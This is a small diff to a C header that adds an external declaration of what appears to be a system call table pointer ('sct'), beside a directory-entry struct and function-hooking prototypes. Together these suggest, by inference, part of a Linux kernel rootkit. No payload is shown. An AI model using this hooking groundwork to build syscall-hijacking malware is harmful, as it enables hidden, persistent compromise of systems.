@@ -47,6 +47,8 @@ struct linux_dirent64
     char            d_name[0];
 };
 
+extern unsigned long *sct;
+
 void hook_start(void *target, void *new);
 void hook_pause(void *target);
 void hook_resume(void *target);
